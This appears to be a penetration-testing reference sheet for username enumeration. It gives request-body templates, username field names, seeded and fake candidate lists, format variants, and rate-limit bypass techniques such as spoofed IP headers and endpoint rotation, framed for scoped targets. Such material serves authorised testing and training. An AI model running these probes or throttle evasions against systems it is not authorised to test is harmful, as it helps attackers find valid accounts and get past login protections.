# Payload variants — the probe bodies and username sets

## The probe bodies

```bash
# form-encoded
-d 'user={U}&pass=x'
-d 'username={U}&password=x'
-d 'email={U}&password=x'
-d 'login={U}&pass=x&csrf=TOK'
-d 'name={U}&pwd=x'

# JSON
-H 'Content-Type: application/json' -d '{"username":"{U}","password":"x"}'
-d '{"email":"{U}","password":"x"}'
-d '{"login":"{U}","pass":"x"}'

# the password held constant — a wrong-but-valid-format one
'x' / 'a' / 'password' / 'Aa1!aaaa'  (meet complexity if validated)
```

## The username slots

`user` `username` `email` `login` `account` `name` `uid` `uname`
`user_name` `login_id` `handle` `member` `sub` `principal` `id`
`identifier` `phone` `mobile`

## The known-good candidates (seeded)

```
admin administrator root test demo user guest ctf flag service
backup deploy jenkins gitlab ci bot system support operator
monitoring prometheus grafana nexus sonar vault consul
superuser sa oracle mysql postgres www-data apache nginx
```

Plus: your own registered account, a challenge-named user, an
app-leaked name (bundle/author/source/git).

## The known-bad candidates

A provably-fake name — long, random, invalid-format:

```
zzz-NOSUCHUSER-9f3a2b
xqz-notarealusername-7c4d
thisuserdoesnotexist-aaaaaaaaaaaaaaaa
```

Use a DIFFERENT fake for the second-bad check — the signal must track
the username-class, not the string.

## The format variants

```
admin        admin@corp.com     ADMIN       Admin
corp\admin   admin.corp         a.admin     admin_x
```

Probe the format the app expects (email vs bare username) — a `404` on
`admin@x.c` that `admin` does not trigger is a format, not an oracle.

## The throttle-bypass variants

```bash
# per-IP reset
-H 'X-Forwarded-For: N.N.N.N' -H 'X-Real-IP: N.N.N.N' -H 'X-Client-IP: ...'
-H 'CF-Connecting-IP: ...' -H 'True-Client-IP: ...' -H 'Forwarded: for=...'
# session reset — fresh cookie/no jar per request
# endpoint rotation — /login /api/login /api/v1/login /auth /token
# method/param rotation — POST vs GET, form vs JSON
# case/space — /LOGIN /login/ 'user ' 'USER'
```

## The candidate-list bound

On a scoped target, a confirmed oracle + a 10-50 name seeded list is a
bounded measurement — `SecLists/Usernames/top-usernames-shortlist.txt`
a slice, the challenge-named users, app-leaked names. NEVER a mass
wordlist.
